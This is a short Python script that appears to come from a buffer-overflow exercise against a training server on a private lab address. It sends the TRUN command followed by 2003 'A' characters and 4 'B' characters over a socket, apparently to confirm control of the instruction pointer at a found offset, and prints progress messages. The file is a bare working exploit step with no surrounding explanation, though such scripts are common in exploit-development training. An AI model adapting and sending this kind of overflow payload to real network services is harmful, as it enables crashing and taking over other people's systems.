#!/bin/python3

import sys
import time
import socket
import termcolor
import threading

rhost = "192.168.37.137";
rport = 9999;

shell_code = f"TRUN /.:/{'A' * 2003}{'B' * 4}";

def printER(string, color):
    print(f"{termcolor.colored('[*]', color)} {string}");

def main():
    printER("Starting...\n", "green");
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        s.settimeout(1);

        s.connect((rhost, rport));

        printER("Sending exploit...\n", "red");
        s.send(shell_code.encode());

        s.close();
        printER("Exploit finshed", "green");
    except:
        printER("Server crashed", "yellow");
        sys.exit();

main();